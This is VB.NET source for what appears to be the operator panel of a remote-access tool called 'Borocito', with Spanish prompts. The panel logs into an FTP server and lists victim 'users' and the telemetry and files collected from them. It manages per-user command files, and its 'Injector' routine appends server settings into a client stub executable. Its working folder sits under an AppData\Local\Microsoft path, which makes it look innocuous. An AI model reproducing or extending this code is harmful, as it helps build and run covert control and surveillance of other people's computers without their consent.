﻿Imports System.IO
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.Win32
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\Control"
    Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
    Public HttpOwnerServer As String
    Public HostOwnerServer As String
    Public HostOwnerServerUser As String
    Public HostOwnerServerPassword As String
    Public userTarget As String
    Public userIDTarget As String
    Public regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\Control", True)
    Public OwnerServer As String
    Public isThemeActive As Boolean = False
    Public isPortable As Boolean = False
    Public CommandRefreshDelay As Integer = 10000
    Public isMultiSelectMode As Boolean = False
End Module
Module Utility
    Function AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False) As String
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
            Catch
            End Try
            Return finalContent & "[" & from & "]" & content
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
            Return "[AddToLog@Utility]Error: " & ex.Message
        End Try
    End Function
    <DllImport("kernel32")>
    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
    End Function
    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
    Sub PutInject(ByVal injectContent As String, ByVal inFilePath As String, ByVal outFilePath As String)
        Try
            If My.Computer.FileSystem.FileExists(outFilePath) Then
                My.Computer.FileSystem.DeleteFile(outFilePath)
            End If
            Dim stub As String
            Const FS1 As String = "|BRO|"
            Dim Temp As String = outFilePath
            Dim bytesEXE As Byte() = System.IO.File.ReadAllBytes(inFilePath)
            File.WriteAllBytes(Temp, bytesEXE)
            FileOpen(1, Temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, Temp, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & FS1 & injectContent & FS1)
            FileClose(1)
            MsgBox("Servidor inyectado correctamente.", MsgBoxStyle.Information, "Injector")
        Catch ex As Exception
            AddToLog("PutInject@Utility", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module Settings
    Sub SetData()
        Try
            If Not isPortable Then
                Dim OwnerServerInput = InputBox("Ingrese la direccion del servidor", "Servidor")
                If OwnerServerInput <> Nothing Then
                    OwnerServer = OwnerServerInput
                    HttpOwnerServer = "http://" & OwnerServer
                End If
                Dim HostOwnerServerInput = InputBox("Ingrese la direccion host del servidor", "Servidor", "ftp://" & OwnerServerInput)
                If HostOwnerServerInput <> Nothing Then
                    HostOwnerServer = HostOwnerServerInput
                End If
                Dim HostOwnerServerUserInput = InputBox("Ingrese el usuario del servidor", "Servidor")
                If HostOwnerServerUserInput <> Nothing Then
                    HostOwnerServerUser = HostOwnerServerUserInput
                End If
                Dim HostOwnerServerPasswordInput = InputBox("Ingrese la contraseña del servidor", "Servidor")
                If HostOwnerServerPasswordInput <> Nothing Then
                    HostOwnerServerPassword = HostOwnerServerPasswordInput
                End If
            End If
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("SetData@Settings", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            If Not isPortable Then
                OwnerServer = regKey.GetValue("OwnerServer")
                HttpOwnerServer = regKey.GetValue("HttpOwnerServer")
                HostOwnerServer = regKey.GetValue("HostOwnerServer")
                HostOwnerServerUser = regKey.GetValue("HostOwnerServerUser")
                HostOwnerServerPassword = regKey.GetValue("HostOwnerServerPassword")
                isThemeActive = regKey.GetValue("isThemeActive")
                CommandRefreshDelay = regKey.GetValue("CommandRefreshDelay")
            Else
                LoadPortable()
            End If
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("LoadRegedit@Settings", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SaveRegedit()
        Try
            If Not isPortable Then
                regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
                regKey.SetValue("HttpOwnerServer", HttpOwnerServer, RegistryValueKind.String)
                regKey.SetValue("HostOwnerServer", HostOwnerServer, RegistryValueKind.String)
                regKey.SetValue("HostOwnerServerUser", HostOwnerServerUser, RegistryValueKind.String)
                regKey.SetValue("HostOwnerServerPassword", HostOwnerServerPassword, RegistryValueKind.String)
                regKey.SetValue("isThemeActive", isThemeActive, RegistryValueKind.String)
                regKey.SetValue("CommandRefreshDelay", CommandRefreshDelay, RegistryValueKind.String)
            End If
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("Init@Settings", "Error: " & ex.Message, True)
        End Try
        LoadRegedit()
    End Sub
    Sub LoadPortable()
        Try
            Dim configFile As String = Application.StartupPath & "\" & My.Application.Info.AssemblyName & ".ini"
            OwnerServer = GetIniValue("SERVER", "OwnerServer", configFile)
            HttpOwnerServer = GetIniValue("SERVER", "HttpOwnerServer", configFile)
            HostOwnerServer = GetIniValue("SERVER", "HostOwnerServer", configFile)
            HostOwnerServerUser = GetIniValue("SERVER", "HostOwnerServerUser", configFile)
            HostOwnerServerPassword = GetIniValue("SERVER", "HostOwnerServerPassword", configFile)
            isThemeActive = GetIniValue("SERVER", "isThemeActive", configFile)
            CommandRefreshDelay = GetIniValue("SERVER", "CommandRefreshDelay", configFile)

            DIRCommons = Application.StartupPath & "\" & My.Application.Info.AssemblyName
            DIRTemp = DIRCommons
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("LoadPortable@Settings", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module StartUp
    Sub Init()
        Try
            regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\Control", True)
            'Ver si es la primera vez
            If AlreadyExist() Then
                'Carga los datos
                LoadRegedit()
            Else
                If Not isPortable Then
                    Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\Control")
                    regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\Control", True)
                    'Pregunta por datos
                    SetData()
                    'Guardar los datos
                    SaveRegedit()
                Else
                    MsgBox("Este Panel de Control no esta configurado", MsgBoxStyle.Critical, "Configuracion Portable")
                    End
                End If
            End If
            'Indexar la lista de comandos
            IndexTheCommands()
            'Obtener lista usuarios
            IndexUsersToPanel()
            'Obtener lista telemetria
            IndexTelemetryToPanel()
            'Obtener lista archivos
            IndexTelemetryFilesToPanel()
            'Obtener los archivos de configuracion del servidor
            GetClientConfig()
            GetGlobalConfig()
            'Aplicando variables
            Main.Label2.Text = "Conectado a: " & OwnerServer
            Main.Label3.Text = My.Application.Info.AssemblyName & " v" & My.Application.Info.Version.ToString & " for " & GetIniValue("Assembly", "Assembly", DIRCommons & "\ClientConfig.ini") & " v" & My.Application.Info.Version.ToString & " (" & GetIniValue("Assembly", "Version", DIRCommons & "\ClientConfig.ini") & ")"
            Main.TextBox2.Text = OwnerServer
            Main.Panel1.Visible = False
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Function AlreadyExist() As Boolean
        Try
            If regKey Is Nothing Then
                Return False
            Else
                Return True
            End If
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Function
    Sub IndexTheCommands()
        Try
            Main.ComboBox1.AutoCompleteCustomSource.Clear()
            Main.ComboBox1.Items.Clear()
            If My.Computer.FileSystem.FileExists(DIRCommons & "\CommandList.txt") Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\CommandList.txt")
            End If
            My.Computer.FileSystem.WriteAllText(DIRCommons & "\CommandList.txt", My.Resources.Comandos, False)
            For Each linea As String In IO.File.ReadLines(DIRCommons & "\CommandList.txt")
                If linea.StartsWith("#") = False Then
                    Main.ComboBox1.AutoCompleteCustomSource.Add(linea)
                    Main.ComboBox1.Items.Add(linea)
                End If
            Next
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("IndexTheCommands@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ReadParameters(ByVal parametros As String)
        Try
            If parametros <> Nothing Then
                Dim parameter As String = parametros
                Dim args() As String = parameter.Split(" ")

                If args(0).ToLower = "/portable" Then
                    isPortable = True
                End If

            End If
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("ReadParameters@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module Network
    Sub IndexUsersToPanel()
        Try
            Main.ListBox1.Items.Clear()
            Main.Label_Status.Text = "WAIT: Loading user files from server..."
            Dim dirFtp As FtpWebRequest = CType(FtpWebRequest.Create(HostOwnerServer & "/Users"), FtpWebRequest)
            Dim cr As New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
            dirFtp.Credentials = cr
            dirFtp.Method = "LIST"
            dirFtp.Method = WebRequestMethods.Ftp.ListDirectory
            Dim reader As New StreamReader(dirFtp.GetResponse().GetResponseStream())
            Dim res As String = reader.ReadToEnd()
            Dim TXVR As New TextBox
            TXVR.Text = res.ToString
            Dim lineas As String() = TXVR.Lines()
            For Each linea As String In lineas
                linea = linea.Remove(0, linea.LastIndexOf("/") + 1)
                linea = linea.Replace(".rtp", Nothing)
                linea = linea.Replace("userID_", Nothing)
                Main.ListBox1.Items.Add(linea)
            Next
            Main.ListBox1.Items.Remove(".")
            Main.ListBox1.Items.Remove("..")
            Main.ListBox1.Items.Remove("Commands")
            reader.Close()
            Main.Label_Status.Text = "User files loaded!"
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("IndexUsersToPanel@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub IndexTelemetryToPanel()
        Try
            Main.ListBox2.Items.Clear()
            Main.Label_Status.Text = "WAIT: Loading telemetry files from server..."
            Dim dirFtp As FtpWebRequest = CType(FtpWebRequest.Create(HostOwnerServer & "/Telemetry"), FtpWebRequest)
            Dim cr As New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
            dirFtp.Credentials = cr
            dirFtp.Method = "LIST"
            dirFtp.Method = WebRequestMethods.Ftp.ListDirectory
            Dim reader As New StreamReader(dirFtp.GetResponse().GetResponseStream())
            Dim res As String = reader.ReadToEnd()
            Dim TXVR As New TextBox
            TXVR.Text = res.ToString
            Dim lineas As String() = TXVR.Lines()
            For Each linea As String In lineas
                linea = linea.Remove(0, linea.LastIndexOf("/") + 1)
                linea = linea.Replace(".tlm", Nothing)
                linea = linea.Replace("telemetry_", Nothing)
                Main.ListBox2.Items.Add(linea)
            Next
            Main.ListBox2.Items.Remove(".")
            Main.ListBox2.Items.Remove("..")
            Main.ListBox2.Items.Remove("tlmRefresh.php")
            reader.Close()
            Main.Label_Status.Text = "Telemetry files loaded!"
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("IndexTelemetryToPanel@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub IndexTelemetryFilesToPanel()
        Try
            Main.ListBox3.Items.Clear()
            Main.Label_Status.Text = "WAIT: Loading repository files from server..."
            Dim dirFtp As FtpWebRequest = CType(FtpWebRequest.Create(HostOwnerServer & "/Files"), FtpWebRequest)
            Dim cr As New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
            dirFtp.Credentials = cr
            dirFtp.Method = "LIST"
            dirFtp.Method = WebRequestMethods.Ftp.ListDirectory
            Dim reader As New StreamReader(dirFtp.GetResponse().GetResponseStream())
            Dim res As String = reader.ReadToEnd()
            Dim TXVR As New TextBox
            TXVR.Text = res.ToString
            Dim lineas As String() = TXVR.Lines()
            For Each linea As String In lineas
                linea = linea.Remove(0, linea.LastIndexOf("/") + 1)
                Main.ListBox3.Items.Add(linea)
            Next
            Main.ListBox3.Items.Remove(".")
            Main.ListBox3.Items.Remove("..")
            reader.Close()
            Main.Label_Status.Text = "Telemetry repository files loaded!"
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("IndexTelemetryFilesToPanel@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub GetClientConfig()
        Try
            Dim LocalFilePath As String = DIRCommons & "\ClientConfig.ini"
            Dim RemoteFilePath As String = HttpOwnerServer & "/Client.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.Network.DownloadFile(RemoteFilePath, LocalFilePath)
            Main.RichTextBox5.Text = My.Computer.FileSystem.ReadAllText(LocalFilePath)
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("GetClientConfig@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub GetGlobalConfig()
        Try
            Dim LocalFilePath As String = DIRCommons & "\GlobalSettings.ini"
            Dim RemoteFilePath As String = HttpOwnerServer & "/GlobalSettings.ini"
            If My.Computer.FileSystem.FileExists(LocalFilePath) Then
                My.Computer.FileSystem.DeleteFile(LocalFilePath)
            End If
            My.Computer.Network.DownloadFile(RemoteFilePath, LocalFilePath)
            Main.RichTextBox4.Text = My.Computer.FileSystem.ReadAllText(LocalFilePath)
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("GetGlobalConfig@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub DeleteTelemetryFile(ByVal fileName As String)
        Try
            Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Files/" & fileName), FtpWebRequest)
            request.Method = WebRequestMethods.Ftp.DeleteFile
            request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
            Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
            Main.Label_Status.Text = CType(response, FtpWebResponse).StatusDescription
            response.Close()
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("DeleteTelemetryFile@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub DeleteUserFile(ByVal user As String)
        user = user.Replace("userID_", Nothing)
        Try
            Try
                Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Users/userID_" & user & ".rtp"), FtpWebRequest)
                request.Method = WebRequestMethods.Ftp.DeleteFile
                request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
                Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
                Main.Label_Status.Text = CType(response, FtpWebResponse).StatusDescription
                response.Close()
            Catch ex As Exception
                Main.Label_Status.Text = AddToLog("DeleteUserFile(UserFile)@Network", "Error: " & ex.Message, True)
            End Try
            Try
                Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Users/Commands/[" & user & "]Command.str"), FtpWebRequest)
                request.Method = WebRequestMethods.Ftp.DeleteFile
                request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
                Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
                Main.Label_Status.Text = CType(response, FtpWebResponse).StatusDescription
                response.Close()
            Catch ex As Exception
                Main.Label_Status.Text = AddToLog("DeleteUserFile(CommandFile)@Network", "Error: " & ex.Message, True)
            End Try
            Try
                Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Telemetry/telemetry_" & user & ".tlm"), FtpWebRequest)
                request.Method = WebRequestMethods.Ftp.DeleteFile
                request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
                Dim response As FtpWebResponse = CType(request.GetResponse(), FtpWebResponse)
                Main.Label_Status.Text = CType(response, FtpWebResponse).StatusDescription
                response.Close()
            Catch ex As Exception
                Main.Label_Status.Text = AddToLog("DeleteUserFile(TelemetryFile)@Network", "Error: " & ex.Message, True)
            End Try
        Catch ex As Exception
            Main.Label_Status.Text = AddToLog("DeleteUserFile@Network", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module